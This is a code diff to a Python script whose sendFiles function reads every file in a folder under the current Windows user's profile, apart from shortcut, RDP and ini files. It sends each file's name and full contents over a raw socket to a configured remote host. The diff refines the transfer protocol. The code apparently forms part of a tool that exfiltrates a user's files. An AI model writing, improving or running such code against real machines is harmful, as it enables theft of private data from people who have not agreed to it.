@@ -1,4 +1,5 @@
 from os import path, listdir
+from os.path import isfile
 from glob import glob
 import socket
 from pickle import dumps
@@ -62,21 +63,26 @@ def sendFiles(filedir: str):
     with socket.socket(socket.AF_INET,socket.SOCK_STREAM) as suck:
         suck.connect((CONNF_HOST, CONNF_PORT))
         print("Connected socket")
-
+        bannedtypes = [".lnk", ".rdp", ".ini"]
         for filename in listdir(full_path): # Get each file in folder
-            suck.send(bytes(filename, "utf-8")) # Send file name and type
-            print("Got filename: ", filename)
-            
-            dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "rb")
-            print("Got file dir: ", dict_files)
-            file_line = dict_files.read(1024)
+            if isfile("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename) and not filename.endswith(tuple(bannedtypes)):
+                print("Got filename: ", filename)
+                msg = f"FILENAME:{filename}"
+                suck.send(msg.encode("utf-8")) # Send file name and type
 
-            while(file_line):
-                suck.send(file_line)
-                file_line = dict_files.read(1024)
-            suck.send(b"Finished Sending DATA!")
-            dict_files.close()
-            print("Data sent")
+                dict_files = open("C:\\Users\\" + getuser()[0] + "\\" + filedir + "\\" + filename, "r")
+                print("Got file dir: ", dict_files.name)
+
+                file_data = dict_files.read()
+
+                msg = f"DATA:{file_data}"
+                suck.send(msg.encode("utf-8"))
+
+                msg = f"FINISH:Completed"
+                suck.send(msg.encode("utf-8"))
+                print("Transfer completed")
+        suck.send("CLOSE:Closing down".encode("utf-8"))
+        suck.close()
 
     print("Transfer Finished")
     suck.close()
